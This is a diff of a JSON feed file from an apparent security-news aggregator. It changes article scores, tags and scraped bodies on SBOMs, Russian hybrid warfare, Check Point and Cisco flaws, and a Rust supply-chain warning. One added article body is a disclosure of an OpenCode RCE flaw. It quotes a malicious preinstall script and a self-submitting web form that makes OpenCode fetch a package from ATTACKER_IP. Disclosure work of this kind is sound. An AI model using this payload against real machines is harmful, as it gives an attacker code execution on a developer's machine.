       "full_body": "< back to blog Why are SBOMs failing to stop supply chain attacks? Published by: Javier Martínez @ linkedin Published: September 24, 2026 Table of contents falco feeds by sysdig Falco Feeds extends the power of Falco by giving open source-focused companies access to expert-written rules that are continuously updated as new threats are discovered. learn more A software bill of materials (SBOM) has the potential to prevent most supply chain attacks. An SBOM is like a “list of ingredients” tag for software that, along with signatures and attestations, enables traceability, including information like: ‍ Who created the software (attribution). Where this software comes from (provenance) What the software contains. A standard format is also an ideal tool for sharing this information between CNAPP tools. However, the lack of motivation to properly verify software integrity and the lack of support from developer tools limit the utility of SBOMs. Let’s analyze the role of SBOMs in the software lifecycle, and what is holding back their adoption. SBOMs in the software lifecycle Software development goes a bit like this: Someone takes a few libraries and tools, puts them all together with code, and creates a new piece of software. It’s also a chain; someone will take this software and build something new on top of it. With so many dependencies between components, an incident on a small component can compromise millions of systems. This is what happens with OpenSSL, an open source cryptography library used by most computer systems. A vulnerability in OpenSSL often becomes a global security risk. This potential impact is what makes supply chain attacks so attractive for malicious actors. Software attestations are great for protecting your infrastructure against most supply chain attacks. They are structured data containing SBOMs, as well as any kind of arbitrary data like the origin source, or a list of vulnerabilities. Attestations can be signed by the developer and software repository. Attestation for container images can be downloaded and verified with docker scout attest: Learn more in How to secure Kubernetes deployment with signature verification . By verifying a container image digest against its attestation signatures, you can determine whether someone has modified the image or impersonated the repository. Be aware that this check has its limitations; it won’t cover cases where the repository itself, or its keys, are compromised. Ideally, you would perform this check before using any software, especially before deploying it to production. Then, you would also generate and sign SBOMs when packaging your own software. For a Kubernetes development, the lifecycle would look something like this: On paper, this looks great: You know what you’re using and where it came from. This protects you from most supply attack vectors. So why are the adoption rates for SBOMs so low? Let’s explore some challenges SBOMs face in achieving support and effectiveness. Challenge 1: Inconsistent tool support Everyone who’s dealt with digital signatures knows the pain it entails. Although many software development tools support attestations, getting all these tools to work together across developers and infrastructure teams requires some setup and fighting with the command line. Implementing this system doesn’t scale to corporate environments or big teams. This causes a vicious cycle. Without tool support, adoption is low, and this low adoption doesn’t motivate tool support. However, with good support from the tools, digital signatures are almost transparent. One good example is Apple’s notarization system. Apple’s developer tools automatically generate, sign, and notarize the apps for the developers. This doesn't generate an SBOM, but it deals with signatures mostly seamlessly. Challenge 2: You can’t trust every SBOM When you buy mayonnaise, its ingredient list won’t tell you whether it contains Salmonella. In the same way, a developer won’t know if their so",
       "fetch_status": "ok"
     },
@@ -2839,7 +2861,7 @@
           "products": []
         }
       },
-      "score": 10
+      "score": 9
     },
     {
       "source": "BleepingComputer",
@@ -2871,7 +2893,7 @@
           "products": []
         }
       },
-      "score": 6
+      "score": 5
     },
     {
       "source": "SecurityWeek",
@@ -2906,7 +2928,7 @@
           "products": []
         }
       },
-      "score": 11
+      "score": 10
     },
     {
       "source": "Kaspersky Securelist",
@@ -3354,7 +3376,7 @@
           "products": []
         }
       },
-      "score": 5
+      "score": 4
     },
     {
       "source": "Recorded Future",
@@ -3386,7 +3408,7 @@
           "products": []
         }
       },
-      "score": 11,
+      "score": 10,
       "full_body": "Russia Escalating Hybrid Attacks across Europe Since Russia’s full-scale invasion of Ukraine in February 2022, Russia has escalated its use of hybrid, asymmetric warfare across Europe, far beyond the former Soviet Union, where Russia historically focused its aggression. These tactics fall under a Russian military strategy known as New Generation Warfare (NGW). Insikt Group assesses that Russia is likely to escalate NGW tactics over the next two years, potentially culminating in a full-scale NGW campaign. Europe-based private and public sector entities are very likely at risk of physical and cyber sabotage as Russia deploys NGW tactics. Critical infrastructure entities in Europe are at high risk of being targeted, potentially resulting in data loss, physical damage to facilities, or injury or death of personnel. Russian hybrid and sabotage activity is nothing new; asymmetric responses to perceived provocations by Russia’s adversaries date back to at least the Soviet Union, when such tactics were called “active measures.” These tactics differ from conventional, kinetic warfare. They do not involve troops moving across a country’s border or a state’s military dropping bombs on an adversary’s capital city. Instead, they are a complex kit of psychological, cyber, and physical tactics meant to achieve several key aims: Test the enemy’s defensive capabilities, as Russia evaluates whether to escalate aggression into a formal, kinetic conflict Degrade the enemy’s critical infrastructure Sow an environment of fear in the enemy’s government and population to degrade the enemy’s ability to respond These tactics fall broadly under a strategy Russian military officials in 2013 termed “New Generation Warfare” (NGW). Insikt Group assesses that Russia started using NGW tactics in Ukraine during and after it annexed Crimea in February 2014; however, since Russia’s full-scale invasion of Ukraine in February 2022, Russia has escalated its use of these tactics across Europe, far beyond the former Soviet Union, where Russia historically focused its aggression. The very rules of war have changed. The role of nonmilitary means of achieving political and strategic goals has grown and, in many cases, they have exceeded the power of force of weapons in their effectiveness. Valeriy Gerasimov, Chief of the General Staff of the Russian Armed Forces Quoted from the 2013 article in Military-Industrial Kurier , where Gerasimov laid out the New Generation Warfare strategy Figure 1: On the evening of August 4, 2026, an explosive quadcopter struck the wing near the fuel tank of an Antonov An-124 cargo aircraft in Leipzig, Germany, in what we assess is the first instance in Europe of a sabotage drone carrying military-grade explosives near critical infrastructure (Source: NPR ) Russia Using Varied Tactics, from Arson to Airspace Violations Russia has used various tactics while employing NGW tactics across Europe, from influence operations to airspace incursions to physical sabotage operations. Influence Operations: Russia has consistently launched influence operations to manipulate public opinion across Europe, and particularly in states Moscow likely views as Kyiv’s core European supporters: the UK, France, Germany, and Poland. These operations include Doppelgänger, Operation Overload, Operation Undercut, and CopyCop. They have often involved impersonating national and pan-European media outlets to disseminate Kremlin propaganda. Example CopyCop Campaign Expansion (Late August 2026): The CopyCop disinformation network expanded further, continuing to impersonate localized news and fact-checking outlets across Europe — especially in France and Norway — using AI-generated text and voice clones. Airspace Incursions: Starting in September 2025, suspected violations of NATO airspace by what are likely Russian drones or jets reached unprecedented levels. Insikt Group tracked 30 such violations between September 2025 and January 2026, compared to 23 suspected or confirm",
       "fetch_status": "ok"
     },
@@ -3424,7 +3446,7 @@
           "products": []
         }
       },
-      "score": 17,
+      "score": 16,
       "full_body": "Christophe Tafani-Dereeper Cloud Security Researcher and Advocate OpenCode is an open-source AI coding agent that launched in June 2025. It has since grown to more than 200,000 GitHub stars and 16 million monthly users, according to its website. Anomaly develops OpenCode. In this post, we demonstrate GHSA-632h-h47v-g4x4 , a remote code execution (RCE) vulnerability we discovered in OpenCode. A content-type confusion in the /global/upgrade API endpoint made an underlying code injection flaw exploitable. OpenCode 1.18.22 fixes the vulnerability. To determine whether you're affected, see How to know if you're affected . OpenCode remote code execution attack flow. (click to enlarge) Note: Anomaly chose not to request a CVE for this vulnerability. Anomaly believes that assigning CVEs to vulnerabilities reported through GitHub Security Advisories incentivizes researchers to submit a high volume of low-quality reports. OpenCode and its web interface OpenCode is an open-source AI coding agent similar to Claude Code, Codex, and Pi. It lets developers use models from providers such as Anthropic and OpenRouter, as well as locally hosted models. The OpenCode terminal UI. (click to enlarge) OpenCode also includes a built-in web interface for running coding sessions from a browser. The OpenCode Web UI (click to enlarge) You can run opencode serve to start the interface. The equivalent opencode web command also opens it in the default browser. $ opencode web ! OPENCODE_SERVER_PASSWORD is not set; server is unsecured. Web interface: http://127.0.0.1:4096/ The web interface requires no authentication by default, but developers can enable basic authentication, which is especially important when exposing OpenCode to a network: OPENCODE_SERVER_PASSWORD = whySoSerious opencode web Basic authentication on OpenCode (click to enlarge) Browsers cache basic authentication credentials, so OpenCode does not prompt for credentials on every request. The exact behavior depends on the browser and version, but modern browsers cache the credentials while the main browser process is running. Exploiting GHSA-632h-h47v-g4x4 for remote code execution An attacker can exploit the vulnerability with a malicious npm package tarball and webpage. First, the attacker hosts a malicious npm package at a public URL. The package can be minimal and contain only a package.json file that executes malicious code through a preinstall script: { \"name\" : \"opencode-ai\" , \"version\" : \"1.0.0\" , \"description\" : \"\" , \"scripts\" : { \"preinstall\" : \"open /System/Applications/Calculator.app && id > /tmp/opencode-rce\" } } The attacker then creates a tarball of the package: tar -czf opencode-malicious.tgz malicious-package/ Finally, the attacker hosts a webpage that sends a top-level cross-origin request to http://127.0.0.1:4096/global/upgrade : < form method = \" POST \" enctype = \" text/plain \" action = \" http://127.0.0.1:4096/global/upgrade \" > < input type = \" hidden \" name = ' {\"target\":\"http://ATTACKER_IP/opencode-malicious.tgz\",\"x\":\" ' value = ' \" } ' > </ form > < script > document . forms [ 0 ] . submit ( ) </ script > When a user running a vulnerable OpenCode installation visits the webpage, the preinstall script executes on the machine running OpenCode. The following video shows the exploit from the perspective of a user running the vulnerable OpenCode 1.18.21: Your browser does not support the video tag. Identifying and exploiting the vulnerability The OpenCode API started by opencode serve exposes an upgrade endpoint. This endpoint upgrades OpenCode to either the latest release or a specified version: POST /global/upgrade HTTP/1.1 Host : 127.0.0.1:4096 Content-Type : text/plain {\"target\":\"1.18.1\"} The following TypeScript function implements the upgrade endpoint: upgrade : Effect . fn ( \"Installation.upgrade\" ) ( function * ( m : Method , target : string ) { let upgradeResult : { code : number ; stdout : string ; stderr : string } | undefined switch ( m ) { case \"curl\" : upgradeRes",
       "fetch_status": "ok"
     },
@@ -3460,7 +3482,7 @@
           "products": []
         }
       },
-      "score": 10
+      "score": 9
     },
     {
       "source": "watchTowr Labs",
@@ -3494,7 +3516,7 @@
           "products": []
         }
       },
-      "score": 27
+      "score": 26
     },
     {
       "source": "Graham Cluley",
@@ -3522,7 +3544,7 @@
           "products": []
         }
       },
-      "score": 6
+      "score": 5
     },
     {
       "source": "AWS Security Blog",
@@ -3554,7 +3576,7 @@
           "products": []
         }
       },
-      "score": 8
+      "score": 7
     },
     {
       "source": "BleepingComputer",
@@ -3582,7 +3604,7 @@
           "products": []
         }
       },
-      "score": 5
+      "score": 4
     },
     {
       "source": "BleepingComputer",
@@ -5019,7 +5041,10 @@
         "affected_products": [],
         "tools_used": [],
         "cve_ids": [
-          "CVE-2026-93616"
+          "CVE-2026-93616",
+          "CVE-2026-85102",
+          "CVE-2026-91843",
+          "CVE-2026-85103"
         ],
         "attack_techniques": [],
         "urgency_signals": [
@@ -5032,7 +5057,9 @@
           "products": []
         }
       },
-      "score": 10
+      "score": 10,
+      "full_body": "Check Point Warns of Management Server Zero-Day Exploited in Targeted Attacks  Swati Khandelwal  Sep 22, 2026 Network Security / Vulnerability Attackers exploited a previously unknown flaw in Check Point's Security Management Server in a handful of targeted attacks on July 23, the company said . The flaw, CVE-2026-93616 , allows an attacker who can access the server's web service to run scripts on it without logging in. Check Point released a fix on September 22 for the server that controls firewall policies for the Check Point gateways it manages. Separately, Check Point said attackers have been trying since September 12 to exploit a VPN flaw it fixed on September 9 . The attempts, against a flaw tracked as CVE-2026-85102, have targeted customers of Spark, Check Point's firewall line for small businesses. When the fix came out, Check Point had no evidence the flaw was being exploited. CVE-2026-93616 is a path traversal bug in the management server's web service. The service does not properly limit which files and folders a request can reach. An attacker can use it to upload scripts to the server and then run them. Check Point rated it 9.8 out of 10 on the CVSS scale in the CVE record for the flaw. Check Point's advisory does not name the targets of the July attacks or the attackers, nor does it say what the attackers did after exploiting the flaw. Management Server Versions and Fix Check Point numbers the Jumbo Hotfix updates for each release by \"Take.\" Its LivePatch channel, which pushes urgent fixes, uses a separate set of take numbers. The CVE record lists these versions as affected: R82.20 with no Jumbo Hotfix installed R82.10 with Jumbo Hotfix Take 44 or below R82 with Jumbo Hotfix Take 126 or below R81.20 with Jumbo Hotfix Take 166 or below R81.10 with Jumbo Hotfix Take 190 or below (end of support) R81, R80.40, R80.30, R80.20, R80.10 and R80 (all end of support) Check Point's advisory lists R82.20 as affected without the \"no Jumbo Hotfix\" condition. On September 16, Check Point fixed a separate flaw in the management server , CVE-2026-91843, through LivePatch. That update was LivePatch Take 28, or Take 29 on R82.20, according to a summary of Check Point's advisory by France's CERT Santé . Check Point says those LivePatch takes do not fix CVE-2026-93616. CVE-2026-85103, a VPN certificate flaw that Check Point fixed on September 9, affected both gateways and management servers. On R82.10, R82, and R81.20, the new flaw's affected list goes one take higher than that flaw's. So a server updated only enough to be outside that September flaw's range is still affected by CVE-2026-93616. The fixed builds, and Check Point's guidance on mitigation, hunting and indicators of compromise, are in support article sk1000171 . Administrators of management servers should: Check the server's release and Jumbo Hotfix take against the list above. Install the fix listed in sk1000171. Use the hunting guidance and indicators of compromise in sk1000171 to look for signs of an attack. Installing the fix does not show whether the server was attacked before. Check Point's advisory names only Security Management as affected and does not say what network access an attacker needs. The Hacker News has asked Check Point about other affected products, the fixed builds, and the July attacks. Spark Firewalls Targeted Through VPN Flaw CVE-2026-85102 is in the way Check Point gateways check certificates while a VPN connection is being set up. It may let an attacker who has not logged in run code on the gateway. Fixes have been out since September 9 and are in support article sk1000117 . The affected products are Security Gateway and Spark firewalls, whether centrally or locally managed, on R81 and R81.10 (both end of support), R81.10.x, R81.20, R82, R82.00.x and R82.10. The Netherlands' National Cyber Security Centre (NCSC) says the flaw applies when these products use Site-to-Site VPN or Remote Access VPN. Check Point said the attempts came from anonymiz",
+      "fetch_status": "ok"
     },
     {
       "source": "The Hacker News",
@@ -5461,7 +5488,9 @@
           "products": []
         }
       },
-      "score": 9
+      "score": 9,
+      "full_body": "",
+      "fetch_status": "fetch_failed:HTTPError"
     },
     {
       "source": "Horizon3 Attack Research",
@@ -8663,7 +8692,9 @@
           "products": []
         }
       },
-      "score": 9
+      "score": 9,
+      "full_body": "Blog Post Download & print article PDF Download & print article PDF One does not simply defend agentically Defenders can’t use AI in the same way attackers can, but there’s much they can do to unlock the potential of agentic cyber defence. Dave Chismon agung fatria via Getty Images One of my favourite cyber security maxims is Halvar Flake’s observation that “All offensive problems are technical problems, and all defensive problems are political problems”. For an attacker conducting offensive cyber actions, the problems that need to be solved are largely technical. They might be: ‘ Do I have an exploit for this vulnerability? ’ or ‘ How do I avoid detection? ’ Whilst defenders also have technical challenges, they mostly wrestle with what Halvar describes as ‘political’ problems (which for the purposes of this discussion can be framed as organisational problems). Problems such as: ‘Can we get budget to replace this end-of-life system or invest in a more secure option?’ ‘How do I get IT operations to make time for patching?’ ‘How do we get a change request to put in firewall rules approved?’ In other words, defenders are most restricted by their organisational policies, whilst most attackers are restricted by technical hurdles. The reason for this difference becomes clear when you compare the core purposes of attackers and defenders. For attackers, their core purpose is ‘to conduct cyber offence’ and success will cause their employer to profit. Whether that’s stealing money from organisations, extorting victims, or exfiltrating information. Cyber offence is their raison d'être . For the defenders, their mission is to help their organisation avoid loss. Their employer’s mission isn’t cyber defence; it will depend upon whatever activity that organisation does (such as developing products, treating patients, or providing digital services). Cyber defence is effectively ‘a cost of doing business’, one of many priorities that the organisation has to manage. This means the cost of cyber defence has to be rigorously assessed to make sure it does not harm the organisation’s competing priorities: ‘Could that money earmarked to replace the end-of-life system be better used on marketing?’ ‘Will that patch take down the VPN?’ ‘How sure are we that the firewall rule will not break a business function that relies on that connectivity?’ Some board members may see little difference between a DoS attack taking down the organisation’s IT, or a poorly implemented action by the cyber defence team that does the same thing. Except that the board can’t shout at an attacker over the phone … Agentic tooling can be used for cyber offence , because AI is good at helping with technical problems with a clearly measurable success state. Offensive problems are mostly technical, and usually have a clear success state (the target program crashes, your malware calls home). But defensive problems , as we’ve established above, are not mostly technical. Nor do they always have a clear success state. Using AI automation for defence therefore quickly becomes a matter of organisational politics, and someone needs to be responsible for the action taken. Defenders simply cannot put AI to work in the same way attackers can. This is an inconvenient truth, as it suggests that the threat from AI-enabled cyber attacks will grow, whilst autonomous / agentic cyber defence might struggle to keep up unless we approach things differently. How can defenders make better use of AI? Rather than trying to mimic attackers’ use of agentic tooling (and risk breaking things), defenders need to solve the problem by explicitly considering the constraints. I am biased, but I think the work on Autonomous Cyber Defence by CETAS – commissioned by the NCSC – is excellent. It identified early that defenders have different levels of appetite for where they would apply AI. But how can we break the problem down further to make it tractable? To start with, let’s examine the technical defensive tasks an",
+      "fetch_status": "ok"
     },
     {
       "source": "SANS Internet Storm Center",
@@ -9400,7 +9431,9 @@
         ],
         "actor_attribution": [],
         "affected_industries": [],
-        "affected_products": [],
+        "affected_products": [
+          "OpenAI/ChatGPT"
+        ],
         "tools_used": [],
         "cve_ids": [
           "CVE-2026-76460"
@@ -9411,14 +9444,16 @@
         ],
         "content_type": "news_report",
         "confidence_tier": "tier_4_news",
-        "role_map": {},
+        "role_map": {
+          "OpenAI/ChatGPT": "target"
+        },
         "weak_tags": {
           "products": []
         }
       },
       "score": 14,
-      "full_body": "",
-      "fetch_status": "fetch_failed:ReadTimeout"
+      "full_body": "Vulnerabilities & Threats Cyber Risk Application Security Cyberattacks & Data Breaches News Cisco Zero-Day Highlights API Endpoint Authentication Issues The authentication bypass flaw CVE-2026-76460 impacts Cisco's Identity Services Engine (ISE) and received a maximum 10 out of 10 CVSS score. Rob Wright , Senior News Director , Dark Reading September 18, 2026 4 Min Read Source: saifulasmee chede via Getty Images Cisco this week disclosed a slew of critical security vulnerabilities impacting its Identity Services Engine (ISE), including a maximum-severity zero-day flaw that's under exploitation. CVE-2026-76460 is an authentication bypass vulnerability impacting an API in ISE , Cisco's network access control and zero-trust solution. According to the company, the flaw stems from \"insufficient authentication control\" on an ISE API endpoint. \"An attacker could exploit this vulnerability by sending a crafted request to an affected API endpoint,\" Cisco said in its advisory . \"A successful exploit could allow the attacker to gain unauthorized access to the affected device by bypassing the web-based management interface.\" The bug was disclosed and patched on Sept. 16, and the Cybersecurity and Infrastructure Security Agency (CISA) added the flaw to its Known Exploited Vulnerabilities (KEV) catalog on the same day. Cisco also disclosed and patched several other bugs affecting ISE and ISE Passive Identity Connector (ISE-PIC) that have similar API authentication issues. Related: MFA Won't Save You From OAuth Consent Abuse It's unclear who is exploiting CVE-2026-76460 and how extensive the activity is. (Dark Reading contacted Cisco for comment, but the company did not address the questions and instead provided a brief statement that echoed the advisory.) But the zero-day attacks illustrate a trend of API authentication issues for the networking giant, as well as beyond. \"Missing authentication for API endpoints is an industry-wide problem,\" Johannes Ullrich, founder of the SANS Internet Storm Center, tells Dark Reading. In theory, each request to an API endpoint should be properly authenticated and access-controlled. However, that doesn't always happen. \"In some cases, APIs that were not directly reachable in the past are exposed, and in the process, proper authentication and access control are skipped,\" Ullrich says. \"This easily happens as more extensive APIs are exposed to support more modern web application interfaces.\" ISE Zero-Day Puts Entire Network at Risk CVE-2026-76460 is particularly dangerous for several reasons. First, successful exploitation allows an attacker to gain root privileges and command execution on vulnerable instances, with no authentication or user interaction required. Second and more importantly, Ullrich explains, ISE itself is used by other Cisco APIs for authentication and access control. Therefore, an attacker that compromises ISE can disable the solution and gain access to various networks or impersonate other hosts. This could lead to additional compromises, he says, because applications may now rely on access control decisions from the compromised ISE platform. Related: Black Hat USA 2026 | OpenAI's Deep Dive Into Hugging Face Incident \"In short, it is like replacing a building's security guard with an imposter, how it allows intruders to enter using fake IDs,\" Ullrich says. \"Employees inside the building will trust these IDs because they believe that the security guard at the entrance checked them.\" In an advisory for CVE-2026-76460, threat intelligence provider BitSight noted that ISE is at the heart of many organizations' identity and network access infrastructure. \"It helps determine which users and devices can connect to a network and what they can access after connecting,\" Emma Stevens, senior threat intelligence advisor at Bitsight, wrote. \"Root-level access to that infrastructure can create visibility, integrity, and availability risks across a much wider environment.\" Ullrich notes that API endpoi",
+      "fetch_status": "ok"
     },
     {
       "source": "Simon Willison",
@@ -9696,7 +9731,7 @@
       "published": "2026-09-18T00:00:00+00:00",
       "summary": "In this post, we examine two vibe-coded credential harvesting platforms, Loot and UltraVault, and the Amazon Bedrock abuse used to validate stolen secrets.",
       "author": "",
-      "in_window": true,
+      "in_window": false,
       "taxonomy": {
         "threat_categories": [],
         "actor_attribution": [],
@@ -9712,8 +9747,7 @@
         "weak_tags": {
           "products": []
         }
-      },
-      "score": 7
+      }
     },
     {
       "source": "Sysdig",
@@ -9724,7 +9758,7 @@
       "published": "2026-09-18T00:00:00+00:00",
       "summary": "EU orgs must juggle reporting obligations and timelines for CRA, GDPR, NIS2, and more. But the most important step is judging what needs reporting.",
       "author": "",
-      "in_window": true,
+      "in_window": false,
       "taxonomy": {
         "threat_categories": [],
         "actor_attribution": [],
@@ -9740,8 +9774,7 @@
         "weak_tags": {
           "products": []
         }
-      },
-      "score": 8
+      }
     },
     {
       "source": "Elastic Security Labs",
@@ -9752,7 +9785,7 @@
       "published": "2026-09-18T00:00:00+00:00",
       "summary": "We linked one Elastic Security project to 100 others and ran the full prebuilt detection catalog from the origin, with all the ingest landing in the linked projects. It held up, and where it deliberately does not reach is the interesting part.",
       "author": "Chuddy Park",
-      "in_window": true,
+      "in_window": false,
       "taxonomy": {
         "threat_categories": [],
         "actor_attribution": [],
@@ -9768,8 +9801,7 @@
         "weak_tags": {
           "products": []
         }
-      },
-      "score": 8
+      }
     },
     {
       "source": "Simon Willison",
@@ -9780,34 +9812,25 @@
       "published": "2026-09-17T23:59:19+00:00",
       "summary": "Be alert: targeted attacks on prominent Rustaceans Important warning from Adam Harvey and the crates security team: We believe that there is an ongoing campaign targeting rust-lang members and owners of popular crates that is attempting to compromise devices and accounts in order to use them to publish malware. A video call is set up for something positive — maybe for a job, maybe for a project, maybe for a contract opportunity — and then that's used as a vector to either get the target to install something on their computer (such as a purportedly missing audio codec) or execute another command (for example, via putting a command on the clipboard). Last month this trick was used in a successful supply chain attack against the array ref crate , among others. Any piece of software that depends on open source (which is almost every piece of software) has a network of human beings who are potential attack vectors - everyone with publishing rights to any of the packages in the dependency ne",
       "author": "",
-      "in_window": true,
+      "in_window": false,
       "taxonomy": {
         "threat_categories": [
           "supply_chain"
         ],
         "actor_attribution": [],
         "affected_industries": [],
-        "affected_products": [
-          "Anthropic/Claude",
-          "OpenAI/ChatGPT"
-        ],
+        "affected_products": [],
         "tools_used": [],
         "cve_ids": [],
         "attack_techniques": [],
         "urgency_signals": [],
         "content_type": "news_report",
         "confidence_tier": "tier_2_operator",
-        "role_map": {
-          "Anthropic/Claude": "target",
-          "OpenAI/ChatGPT": "target"
-        },
+        "role_map": {},
         "weak_tags": {
           "products": []
         }
-      },
-      "score": 11,
-      "full_body": "Simon Willison’s Weblog Subscribe Sponsored by: Teleport — See what 13 engineers learned from “pressure washing” their codebase using LLMs for 90 days. Hint: Quality > quantity for finding security vulnerabilities. 17th September 2026 - Link Blog Be alert: targeted attacks on prominent Rustaceans . Important warning from Adam Harvey and the crates security team: We believe that there is an ongoing campaign targeting rust-lang members and owners of popular crates that is attempting to compromise devices and accounts in order to use them to publish malware. A video call is set up for something positive — maybe for a job, maybe for a project, maybe for a contract opportunity — and then that's used as a vector to either get the target to install something on their computer (such as a purportedly missing audio codec) or execute another command (for example, via putting a command on the clipboard). Last month this trick was used in a successful supply chain attack against the array ref crate , among others. Any piece of software that depends on open source (which is almost every piece of software) has a network of human beings who are potential attack vectors - everyone with publishing rights to any of the packages in the dependency network for that software. I guess our best defense right now is dependency cooldowns - giving new package releases a few days before upgrading to them, in the hope that supply chain attacks like this will be spotted by someone else. Posted 17th September 2026 at 11:59 pm Recent articles Claude Opus 5.5, GPT-6 Sol, GPT-6 Luna, and a new price war - 22nd September 2026 Jev introduces a new shape of LLM - System One, aka Decision Models - 21st September 2026 Generating running routes with GPT-6 Astra and ChatGPT Work - 12th September 2026 This is a link post by Simon Willison, posted on 17th September 2026 . open-source 321 security 638 rust 114 supply-chain 22 dependency-cooldowns 5 Monthly briefing Sponsor me for $10/month and get a curated email digest of the month's most important LLM developments. Pay me to send you less! Sponsor & subscribe Disclosures Colophon © 2002 2003 2004 2005 2006 2007 2008 2009 2010 2011 2012 2013 2014 2015 2016 2017 2018 2019 2020 2021 2022 2023 2024 2025 2026",
-      "fetch_status": "ok"
+      }
     },
     {
       "source": "Simon Willison",
@@ -9818,7 +9841,7 @@
       "published": "2026-09-17T23:37:27+00:00",
       "summary": "How To Write With An LLM Thomas Ptacek on using LLMs as copyeditors, not as writing assistants: Rule Number One: You may not use a single word an LLM suggests to you. [...] I think that as a form of intellectual personal protective equipment you should adopt the rule that any specific turn of phrase an LLM suggests is off limits. Be strict about the rule! I won't let LLMs write content for my blog, but I use them for fact-checking, spelling and grammar and as an occasional thesaurus (see my proofreading prompt ). The rule to never use a turn of phrase suggested by an LLM feels good to me. The text has that weird smell to it, and it's also a good principle to help stay disciplined. Later in this piece Thomas shows a screenshot of his personal LLM copyediting tool (see also this Twitter thread ), and provides a prompt to help kickstart building your own. Update : Thomas also shared his system prompt in a comment on Hacker News. Tags: thomas-ptacek , writing , ai , generative-ai , llms",
       "author": "",
-      "in_window": true,
+      "in_window": false,
       "taxonomy": {
         "threat_categories": [],
         "actor_attribution": [],
@@ -9834,8 +9857,7 @@
         "weak_tags": {
           "products": []
         }
-      },
-      "score": 6
+      }
     },
     {
       "source": "Unit 42",
@@ -41463,6 +41485,33 @@
       }
     },
     {
+      "source": "Wiz Research",
+      "cohort": "cloud_identity_infrastructure",
+      "category": "cloud_identity_infrastructure",
+      "title": "Build Fast, Build Secure: Wiz findings are now in Lovable",
+      "link": "https://www.wiz.io/blog/introducing-wiz-lovable-integration",
+      "published": "2026-05-07T13:00:00+00:00",
+      "summary": "With Wiz in Lovable, every builder can catch and fix risks in real time, keeping apps secure as they’re created",
+      "author": "Roi Kessler",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "low_signal",
+        "confidence_tier": "tier_2_operator",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
       "source": "Cloudflare Security",
       "cohort": "cloud_identity_infrastructure",
       "category": "cloud_identity_infrastructure",
@@ -41488,33 +41537,6 @@
         "role_map": {
           "Linux kernel": "target"
         },
-        "weak_tags": {
-          "products": []
-        }
-      }
-    },
-    {
-      "source": "Wiz Research",
-      "cohort": "cloud_identity_infrastructure",
-      "category": "cloud_identity_infrastructure",
-      "title": "Build Fast, Build Secure: Wiz findings are now in Lovable",
-      "link": "https://www.wiz.io/blog/introducing-wiz-lovable-integration",
-      "published": "2026-05-07T13:00:00+00:00",
-      "summary": "With Wiz in Lovable, every builder can catch and fix risks in real time, keeping apps secure as they’re created",
-      "author": "Roi Kessler",
-      "in_window": false,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "low_signal",
-        "confidence_tier": "tier_2_operator",
-        "role_map": {},
         "weak_tags": {
           "products": []
         }
